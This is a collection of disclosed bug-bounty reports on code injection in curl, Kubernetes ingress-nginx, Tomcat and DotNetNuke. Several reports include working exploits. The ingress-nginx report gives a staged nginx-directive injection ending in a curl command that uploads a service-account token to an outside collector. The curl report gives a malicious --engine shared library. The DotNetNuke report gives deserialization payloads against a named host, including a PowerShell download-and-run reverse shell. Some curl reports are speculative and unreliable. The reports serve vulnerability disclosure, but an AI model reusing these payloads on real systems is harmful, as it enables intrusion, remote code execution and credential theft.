# Code Injection

_138 reports — High/Critical, disclosed_

### [Internal application wrapper or script using curl](https://hackerone.com/reports/3648199)

- **Report ID:** `3648199`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** curl
- **Reporter:** @rougerseven7
- **Bounty:** - usd
- **Disclosed:** 2026-04-03T22:00:59.225Z
- **CVE(s):** -

**Vulnerability Information:**

While -guid is not a standard or documented curl command,  a Command Injection or Argument Injection vulnerability within a specific application that wraps curl.

Security Analysis: curl -guid -url  example.com

1. Status of the "-guid" FlagUndocumented/Non-existent: The official curl binary does not recognize a -guid flag. Standard versions will return an "unrecognized option" error.Custom Wrappers: This flag likely belongs to a custom internal script or a specialized wrapper (e.g., a "curl-guid" alias or a corporate security wrapper) that processes GUIDs for tracking requests.Injection Vector: If an application takes user input to fill this -guid field without sanitization, an attacker can break out of the intended command structure.
2. Attack Mechanism (Argument Injection)In a vulnerable system, the command might be constructed like this: system("curl -guid " + user_input + " -url example.com").The Payload: An attacker could provide a "GUID" like 123 -o /etc/shadow.Resulting Command: curl -guid 123 -o /etc/shadow -url example.com
Consequence: Instead of just passing a GUID, curl is instructed to overwrite a sensitive system file (like the password shadow file) with the contents of example.com.

## Impact

## Summary:
Potential ImpactsSetting/Resetting Passwords: By using the -o (output) flag, an attacker can overwrite authentication files (e.g., .htpasswd or /etc/passwd) with their own known values.Information Disclosure: Attackers can use flags like -d to send local secret files to their own server.Remote Code Execution (RCE): On some systems, injecting --engine can load a malicious shared object file, granting full control over the host.RecommendationsStrict Input Validation: Use a regular expression to ensure the input is a valid GUID format (e.g., ^[0-9a-fA-F-]{36}$).Avoid Shell Execution: Do not use system() or shell wrappers. Use language-specific libraries (like libcurl bindings for Python or C) that pass arguments as a safe array.Use the -- Terminator: If you must use a shell, place -- before user-provided URLs to stop curl from interpreting following inputs as flags

---

### [Injection in path parameter of Ingress-nginx](https://hackerone.com/reports/2701701)

- **Report ID:** `2701701`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Kubernetes
- **Reporter:** @fisjkars
- **Bounty:** - usd
- **Disclosed:** 2026-03-07T05:10:30.190Z
- **CVE(s):** CVE-2021-25748

**Vulnerability Information:**

The objective of an Ingress Controller is to act as a gatekeeper for all incoming traffic to a Kubernetes cluster. It is responsible for routing and managing traffic coming into the cluster from external sources, allowing for efficient and secure communication between the cluster and the outside world. 

An attacker in a multi-tenant cluster with permission to create/modify ingresses can inject content into the connection-proxy-header annotation and read arbitrary files from the ingress controller (including the service account).

The `path` parameter allows users to specify which HTTP path of the given host should be redirected to the ingress's defined backend, as the `path` parameter is permissive, it is possible to inject arbitrary nginx directives when creating a new ingress. 

As a few restrictions are in place due to one of the mitigations of [CVE-2021-25748](https://github.com/kubernetes/kubernetes/issues/126814) in the corresponding inspector for ingresses, it is not possible to execute code trivially by using the `by_lua` functions, to circumvent this protection we can proceed using a two-stages exploit : 

* We first create an ingress abusing the nginx directive `client_body_in_file_only` in order to upload the body of an HTTP POST request to the ingress's filesystem.
* We send an HTTP POST request to this ingress, with an nginx configuration using the `set_by_lua_block` directive
* Then we create a second ingress that will include this uploaded file
* Finally, we send a last request to abuse the included configuration and execute code on the ingress controller

Stage one, ingress allowing file upload to `/tmp/nginx/f292392` : 
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    kubernetes.io/ingress.class: nginx
  name: f292392-research
  namespace: default
spec:
  rules:
  - host: f292392.com
    http:
      paths:
      - backend:
          service:
            name: legitimate-service
            port:
              number: 80
        path: |-
          /f292392body/ {
          limit_except POST              { deny all; }
          client_body_temp_path          /tmp/nginx/f292392;
          client_body_in_file_only       on;
          client_body_buffer_size        128K;
          #
        pathType: Prefix
```

We then send a POST request to the ingress that will upload a malicious nginx configuration to the ingress controller (you should replace the IP address with your own ingress controller's IP) : 

```sh
curl http://f292392.com/f292392body/ --resolve f292392.com:80:4.178.145.81 -k -vv --data-binary '@./exploit.txt'
```

Where `exploit.txt` is our malicious configuration : 

```
set_by_lua_block $my_var { 
            local rsfile = io.popen(ngx.req.get_headers()["pathinjection"]);
            local rschar = rsfile:read("*all");ngx.say(rschar); 
            return rschar;
} 
proxy_set_header X-My-Var $my_var;
```

Now that the file is uploaded, we can create a new ingress that imports it (since we cannot be sure what the exact filename will be, we can use a wildcard character to include this configuration, as we should be the only having queried this ingress : 

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    kubernetes.io/ingress.class: nginx
  name: f292392-research
  namespace: default
spec:
  rules:
  - host: f292392.com
    http:
      paths:
      - backend:
          service:
            name: legitimate-service
            port:
              number: 80
        path: |-
          /rcewithhost/ {
          include /tmp/nginx/f292392/*;
  
          #
        pathType: Prefix
```

Using the `set_by_lua_block` directive we set the $my_var variable to the output of the shell command found in the `pathinjection` header, this var is then set as the `X-My-Var` header.

With the following curl command, we can now retrieve the serviceaccount's token : 

```
curl http://f292392.com/rcewithhost/ --resolve f292392.com:80:4.178.145.81 -k -H "pathinjection: curl -F 'file=@/var/run/secrets/kubernetes.io/serviceaccount/token' http://hdyy6lwp6kifbu1cv7euclvuyl4cs3gs.oastify.com.oastify.com"
```

{F3577415}

We now get an HTTP request with the content of the token : 
{F3577417}

Here the content of `nginx.conf` and the uploaded file after the exploit :
{F3577418}

{F3577426}

## Impact

An attacker in a multi-tenant cluster with permission to create/modify ingresses can inject content into the connection-proxy-header annotation and read arbitrary files from the ingress controller (including the service account).

---

### [[RCE] Remote Code Execution via  React Server Components Vulnerability CVE-2025-55182](https://hackerone.com/reports/3458235)

- **Report ID:** `3458235`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** IBM
- **Reporter:** @kanon4
- **Bounty:** - usd
- **Disclosed:** 2025-12-18T16:17:43.356Z
- **CVE(s):** CVE-2025-55182

**Summary (team):**

[RCE] Remote Code Execution on an IBM endpoint via React Server Components Vulnerability CVE-2025-55182 was reported to IBM, analyzed and has been remediated. Thank you to our external researcher @kanon4. 
.

---

### [Title: Remote Code Execution (RCE) via Arbitrary Library Loading in `--engine` option](https://hackerone.com/reports/3293801)

- **Report ID:** `3293801`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** curl
- **Reporter:** @z1andr4g0n
- **Bounty:** - usd
- **Disclosed:** 2025-08-10T21:58:44.277Z
- **CVE(s):** -

**Vulnerability Information:**

#### Summary:
The `curl` command-line tool is vulnerable to Arbitrary Code Execution on POSIX-like systems (Linux, macOS, etc.). The `--engine` option allows loading an OpenSSL crypto engine from a shared library (`.so` file). Crucially, this option accepts an **absolute or relative path** to the library file, allowing a user to load any shared library on the file system.

An attacker can craft a malicious shared library containing a `__attribute__((constructor))` function. This function is executed by the dynamic loader the moment the library is loaded into the `curl` process's memory, achieving immediate code execution, even before OpenSSL attempts to initialize it as an engine.

This leads to direct RCE if an attacker can influence the arguments passed to a `curl` command, a common scenario in web application backends, CI/CD pipelines, and other automated scripts.

*(Statement as per disclosure policy: This vulnerability was discovered and verified by me. An AI assistant was used to help structure and draft this report based on my findings and proof-of-concept.)*

#### Affected version:
I reproduced this on the following version, but it likely affects all versions that support the `--engine` option on POSIX systems with GCC/Clang compiled binaries.
```
┌──(Dr4g0n㉿DESKTOP-2CIPGDF)-[~]
└─$ curl -V
curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.5.0 zlib/1.3.1 brotli/1.1.0 zstd/1.5.7 libidn2/2.3.8 libpsl/0.21.2 libssh2/1.11.1 nghttp2/1.64.0 nghttp3/1.8.0 librtmp/2.3 OpenLDAP/2.6.9
Release-Date: 2025-04-02, security patched: 8.13.0-5
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli GSS-API HSTS HTTP2 HTTP3 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM PSL SPNEGO SSL threadsafe TLS-SRP UnixSockets zstd
```
#### Steps To Reproduce:
These steps will demonstrate direct code execution on a WSL/Linux system.

1.  **Step 1: Create the malicious payload.**
    Save the following C code as `evil_engine.c`. This code will execute `id > /tmp/RCE_VIA_ENGINE` the moment the library is loaded.

    ```c
    #include <stdlib.h>

    // This constructor function is executed automatically by the dynamic loader
    // as soon as the library is loaded into the process address space.
    __attribute__((constructor))
    static void rce_init(void) {
        system("id > /tmp/RCE_VIA_ENGINE");
    }
    ```

2.  **Step 2: Compile the payload into a shared library.**
    Use `gcc` to compile the C code into a shared object (`.so`) file.

    ```bash
    gcc -fPIC -shared -o evil_engine.so evil_engine.c
    ```

3.  **Step 3: Prepare for verification.**
    Ensure the proof file does not exist before the attack.

    ```bash
    rm -f /tmp/RCE_VIA_ENGINE
    ```

4.  **Step 4: Execute `curl` with the malicious engine.**
    Run any `curl` command, but use the `--engine` option to point to our malicious library. Note that we must provide an absolute path.

    ```bash
    curl --engine `pwd`/evil_engine.so https://example.com
    ```
    *You will see an error message like `curl: (53) SSL Engine '...' not found`. This error is expected and irrelevant, as it occurs **after** our malicious code has already been executed by the constructor.*

5.  **Step 5: Verify Code Execution.**
    Check the contents of the proof file.

    ```bash
    cat /tmp/RCE_VIA_ENGINE
    ```
    The command will output the result of the `id` command, confirming that arbitrary code was executed successfully as the user who ran `curl`.

#### Supporting Material/References:
I have recorded a full video of the Proof of Concept: `PoC.mp4`

## Impact

The security impact is **direct and critical Remote Code Execution**.

An attacker who can control or influence the arguments passed to a `curl` command can achieve RCE on the underlying system. This completely bypasses any application-level security.

Common attack scenarios include:
*   **Web Application Backends:** A web service that allows users to provide options for a `curl` command (e.g., in a "website checker" or "webhook tester" feature) would be vulnerable. An attacker could inject `--engine /path/to/payload.so` if they can also upload a file.
*   **CI/CD Pipelines & Scripts:** Automated scripts that build `curl` commands using variables from external, untrusted sources (like commit messages or API responses) could be tricked into loading a malicious engine.
*   **Social Engineering:** A developer or system administrator could be tricked into running a seemingly benign diagnostic command provided by an attacker, which includes the malicious `--engine` flag.

The vulnerability stems from the `--engine` feature trusting a user-provided path without any validation or restriction to a secure, system-defined directory for crypto engines. This effectively turns the feature into a "load-and-run" primitive for arbitrary shared libraries.

---

### [Uncontrolled File Write/Arbitrary File Creation ](https://hackerone.com/reports/3250117)

- **Report ID:** `3250117`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** curl
- **Reporter:** @hadesguy
- **Bounty:** - usd
- **Disclosed:** 2025-07-13T17:12:26.448Z
- **CVE(s):** -

**Vulnerability Information:**

# Description

The dumpeasysrc function in the provided code snippet allows an attacker to specify an arbitrary file path for outputting the generated libcurl source code via the global->libcurl variable. If the global->libcurl value is not properly sanitized or restricted, a malicious user could provide a path to a sensitive system file (e.g., /etc/passwd, /etc/cron.d/malicious_job, user's .bashrc, etc.) or a device file (e.g., /dev/null, /dev/random).

The core issue is that fopen(o, FOPEN_WRITETEXT) is called directly with o = global->libcurl without any checks on the path provided.

# Vulnerable code 

```
void dumpeasysrc(struct GlobalConfig *global)
{
  struct curl_slist *ptr;
  char *o = global->libcurl; // <--- 'o' holds the user-supplied file path

  FILE *out;
  bool fopened = FALSE;
  if(strcmp(o, "-")) {
    out = fopen(o, FOPEN_WRITETEXT); // <--- Direct use of user-supplied path in fopen()
    fopened = TRUE;
  }
  else
    out = stdout;
  // ... rest of the function writes data to 'out'
}
```

# Proof of Concept (POC) to Prove Real Vulnerability and Step-by-Step
I will demonstrate overwriting a user-created, non-critical file within a standard temporary directory. This is easily reproducible and clearly shows the integrity impact without attempting to directly compromise critical system files, which might be blocked by OS permissions for a regular user.

1. Create a distinctive, dummy file in a temporary location:
```
echo "This is the ORIGINAL content of the file." > /tmp/curl_test_overwrite.txt
ls -l /tmp/curl_test_overwrite.txt
cat /tmp/curl_test_overwrite.txt
```

{F4561625}

2. Execute the vulnerable curl command to overwrite the file:
Assuming your curl executable (the one you built with the vulnerable code) is accessible in your PATH or you're running it with ./curl.

#Curl Version
```
└─# ./curl -V                                                        
WARNING: this libcurl is Debug-enabled, do not use in production

curl 8.15.0-DEV (x86_64-pc-linux-gnu) libcurl/8.15.0-DEV zlib/1.3.1 libpsl/0.21.2
Release-Date: [unreleased]
Protocols: dict file ftp gopher http imap ipfs ipns mqtt pop3 rtsp smtp telnet tftp ws
Features: alt-svc AsynchDNS Debug IPv6 Largefile libz PSL threadsafe TrackMemory UnixSockets
```

```
./curl --libcurl /tmp/curl_test_overwrite.txt http://example.com
```

{F4561649}

Using http://example.com is better than google.com as it avoids potential redirects and makes the curl output simpler, focusing on the --libcurl aspect.

3. Verify the content of the file after the curl execution:
```
cat /tmp/curl_test_overwrite.txt
```

The content of /tmp/curl_test_overwrite.txt will be replaced by the generated libcurl C code. It will look something like this:

{F4561653}

## Impact

Data Corruption/Loss: Arbitrary files can be overwritten with the generated libcurl C source code.

---

### [Potential XSS vector in curl via unsanitized URL parameter handling](https://hackerone.com/reports/3118915)

- **Report ID:** `3118915`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** curl
- **Reporter:** @redfoxsec
- **Bounty:** - usd
- **Disclosed:** 2025-06-30T18:55:00.038Z
- **CVE(s):** -

**Vulnerability Information:**

Description
 Summary:
During the analysis of the curl source code, a possible vector for Cross-Site Scripting (XSS) was identified through the glob_url() function and how URL input is handled via urlnode->url. Improper input validation or escaping could result in untrusted data being processed insecurely.

Affected version:
Latest GitHub clone of curl/curl.
Tested on: Kali Linux (VirtualBox)
Version command:

curl -v 

 Steps To Reproduce:
Clone the repository:

git clone https://github.com/curl/curl.git  
cd curl  

Search vulnerable code references:

grep -rn "glob_url" src/  
grep -rn "urlnode" src/  
grep -rn "strcpy" src/  

Try payloads in real requests using encoded XSS strings:

curl "http://test.com?param=%3Cscript%3Ealert(1)%3C/script%3E" -w "%{url_effective}"

Observe the failure behavior and how the payload is processed or rejected (301 redirect, malformed input, reflected parts, etc.).

Supporting Material/References:
Terminal output with code search and payload attempts:

glob_url() usage and unsafe patterns

Attempts to inject payloads with curl

Screenshots attached for reference

## Impact

Impact
If successfully exploited, this flaw could lead to XSS through insecure processing of user-controlled URLs.
An attacker could:

Steal session cookies or tokens

Redirect victims to malicious sites

Execute code in the browser context

Perform phishing or social engineering attacks

This issue becomes critical in contexts where curl is embedded in user-facing applications, CLI tools processing user input, or CI pipelines consuming untrusted URLs.

---

### [[SECURITY] CVE-2024-50379 Apache Tomcat - RCE via write-enabled default servlet](https://hackerone.com/reports/2905013)

- **Report ID:** `2905013`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Internet Bug Bounty
- **Reporter:** @nacl_123
- **Bounty:** - usd
- **Disclosed:** 2025-05-27T15:31:48.282Z
- **CVE(s):** CVE-2024-50379

**Vulnerability Information:**

Code injection triggered by a race condition on a Windows machine.

## Impact

Code injection

**Summary (team):**

If the default servlet is write enabled (readonly initialisation
parameter set to the non-default value of false) for a case insensitive
file system, concurrent read and upload under load of the same file can
bypass Tomcat's case sensitivity checks and cause an uploaded file to be
treated as a JSP leading to remote code execution.

https://lists.apache.org/thread/y6lj6q1xnp822g6ro70tn19sgtjmr80r

---

### [CVE-2017-9822 DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci](https://hackerone.com/reports/2762119)

- **Report ID:** `2762119`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** MTN Group
- **Reporter:** @odaysec
- **Bounty:** - usd
- **Disclosed:** 2024-11-16T19:38:39.134Z
- **CVE(s):** CVE-2017-9822

**Vulnerability Information:**

## Summary:
DotNetNuke (DNN) versions between 5.0.0 - 9.3.0 are affected to deserialization vulnerability that leads to Remote Code Execution (RCE). DotNetNuke uses the `DNNPersonalization` cookie to store anonymous users’ personalization options (the options for authenticated users are stored through their profile pages). This cookie is used when the application serves a custom 404 Error page, which is also the default settings. 

```cs
public static Hashtable DeSerializeHashtable(string xmlSource, string rootname)
{
	var HashTable = new Hashtable();

	if (!String.IsNullOrEmpyt(xmlSource))
	{
		try
		{
			var xmlDoc = new XmlDocument();
			xmlDoc.LoadXml(xmlSource);

			foreach (XmlElement xmlItem in xmlDoc.SelectNodes(rootname + "/item"))
			{
				string key = xmlItem.GetAttribute("key");
				string typeName = xmlItem.GetAttribute("type");
				
				// Create the XmlSerializer
				var xser = new XmlSerializer(Type.GetType(typeName));

				var readder = new XmlTextReadder(new StringReader(xmlItem.InnerXml));

				// Use the Deserialize method to restore the object's state, and store it
				// in the Hashtable
				hashTable.Add(key, xser.Deserialize(reader));
			}
		}
		catch(Exception)
		{
			// Logger.Error(ex); /*Ignore Log because if failed on profile this will log on every request.*/
		}
	}

	return hashTable;
}
```
The expected structure includes a `type` attribute to instruct the server which type of object to create on deserialization. The cookie is processed by the application whenever it attempts to load the current user's profile data, which occurs when DNN is configured to handle 404 errors with its built-in error page (default configuration). An attacker can leverage this vulnerability to execute arbitrary code on the system.






## Proof of Concept (PoC) :
In order to generate payload (to check vuln.), use [YSoSerial.net](https://github.com/pwntester/ysoserial.net) with DotNetNuke plugin
```
PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke --help
ysoserial.net generates deserialization payloads for a variety of .NET formatters.

Plugin:

DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)

Options:

  -m, --mode=VALUE           the payload mode: read_file, write_file,
                               run_command.
  -c, --command=VALUE        the command to be executed in run_command mode.
  -u, --url=VALUE            the url to fetch the file from in write_file
                               mode.
  -f, --file=VALUE           the file to read in read_file mode or the file
                               to write to in write_file_mode.
      --minify               Whether to minify the payloads where applicable
                               (experimental). Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple.
                               Default: true
```
```
PS C:\>ysoserial.net\ysoserial\bin\Release\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini
```
or simply, use the following payload
```xml
<profile>
    <item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
        <ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <ExpandedElement />
            <ProjectedProperty0>
                <MethodName>WriteFile</MethodName>
                <MethodParameters>
                    <anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType>
                </MethodParameters>
                <ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance>
            </ProjectedProperty0>
        </ExpandedWrapperOfFileSystemUtilsObjectDataProvider>
    </item>
</profile>
```
If everything goes well, following request will return content of win.ini file in response body.
```
GET /__ HTTP/1.1
Host: lonidoor.mtn.ci
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```
```
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
Set-Cookie: .ASPXANONYMOUS=...; expires=Wed, 28-Oct-2024 03:54:58 GMT; path=/; HttpOnly
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 19 Aug 2020 17:14:58 GMT
Connection: close
Content-Length: 109

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

## Proof of Concept (PoC) 2: Aggressive Mode (exploit with powershell reverse tcp shell)
On local machine, listen any port that you don't use
```
$ nc -nlvp 7575
```
Generate payload using YSoSerial.net with DotNetNuke plugin
```
PS C:\ysoserial.net\ysoserial\bin\Debug> .\ysoserial.exe -p DotNetNuke -m run_command -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.101 -Port 7575"
```
Payload
```
<profile>
    <item key="key" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
        <ExpandedWrapperOfObjectStateFormatterObjectDataProvider>
            <ProjectedProperty0>
                <ObjectInstance p3:type="ObjectStateFormatter" xmlns:p3="http://www.w3.org/2001/XMLSchema-instance" />
                <MethodName>Deserialize</MethodName>
                <MethodParameters>
                    <anyType xmlns:q1="http://www.w3.org/2001/XMLSchema" p5:type="q1:string" xmlns:p5="http://www.w3.org/2001/XMLSchema-instance">/wEylQkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3Bzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmF0YXNob2svbmlzaGFuZy9tYXN0ZXIvU2hlbGxzL0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScpO0ludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTkyLjE2OC4xLjEwMSAtUG9ydCA3NTc1IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType>
                </MethodParameters>
            </ProjectedProperty0>
        </ExpandedWrapperOfObjectStateFormatterObjectDataProvider>
    </item>
</profile>
```
```
GET /__ HTTP/1.1
Host: lonidoor.mtn.ci
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key="key" type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.ObjectStateFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfObjectStateFormatterObjectDataProvider><ProjectedProperty0><ObjectInstance p3:type="ObjectStateFormatter" xmlns:p3="http://www.w3.org/2001/XMLSchema-instance" /><MethodName>Deserialize</MethodName><MethodParameters><anyType xmlns:q1="http://www.w3.org/2001/XMLSchema" p5:type="q1:string" xmlns:p5="http://www.w3.org/2001/XMLSchema-instance">/wEylQkAAQAAAP////8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC3Bzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8+DQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgaWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vc2FtcmF0YXNob2svbmlzaGFuZy9tYXN0ZXIvU2hlbGxzL0ludm9rZS1Qb3dlclNoZWxsVGNwLnBzMScpO0ludm9rZS1Qb3dlclNoZWxsVGNwIC1SZXZlcnNlIC1JUEFkZHJlc3MgMTkyLjE2OC4xLjEwMSAtUG9ydCA3NTc1IiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs=</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfObjectStateFormatterObjectDataProvider></item></profile>
```


## Supporting Material/References:
https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/
